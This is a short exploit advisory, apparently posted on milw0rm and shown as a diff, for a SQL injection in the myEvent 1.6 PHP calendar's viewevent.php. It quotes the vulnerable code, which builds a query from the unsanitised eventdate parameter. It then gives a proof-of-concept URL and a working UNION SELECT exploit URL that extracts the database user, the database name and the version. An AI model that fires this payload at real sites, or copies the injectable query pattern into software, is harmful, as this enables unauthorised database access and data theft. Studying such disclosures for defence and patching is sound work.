@@ -1,0 +1,27 @@
+# myEvent 1.6 (viewevent.php) Remote SQL Injection Vulnerability
+# url: http://mywebland.com/
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+#
+# Greetz To: All Hackers and milw0rm website
+
+vuln file: /viewevent.php
+vuln code:
+43: if (isset($_GET['eventdate']))
+xx: ...
+93: $sql = "SELECT  * FROM event WHERE  date = '$eventdate'" ;
+
+94: $results = mysql_query($sql) or die("Cannot query the database.<br>" . mysql_error());
+
+95: $event  = mysql_num_rows($results);
+
+PoC:     /viewevent.php?eventdate='[foo]
+Exploit: /viewevent.php?eventdate='+union+all+select+1,1,concat(user(),char(32,35),database(),char(32,35),version())/*
+
+# milw0rm.com [2008-10-15]
